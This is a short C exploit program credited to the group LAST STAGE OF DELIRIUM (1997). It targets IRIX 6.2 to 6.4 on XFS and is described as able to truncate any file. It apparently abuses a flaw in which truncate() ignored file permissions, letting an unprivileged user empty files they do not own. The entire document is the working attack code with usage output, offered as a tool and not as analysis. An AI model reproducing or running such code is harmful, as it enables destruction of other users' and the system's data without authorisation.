/*## copyright LAST STAGE OF DELIRIUM feb 1997 poland        *://lsd-pl.net/ #*/
/*## truncate                                                                #*/

/*   truncates any file on a xfs filesystem                                   */

main(int argc,char **argv){
    printf("copyright LAST STAGE OF DELIRIUM feb 1997 poland   //lsd-pl.net\n");
    printf("truncate for irix 6.2 6.3 6.4 IP:all\n\n");

    if(argc!=2){
        printf("usage: %s file\n",argv[0]);
        exit(-1);
    }

    if(!truncate(argv[1],0)) printf("file %s truncated\n",argv[1]);
    else perror("error");
}

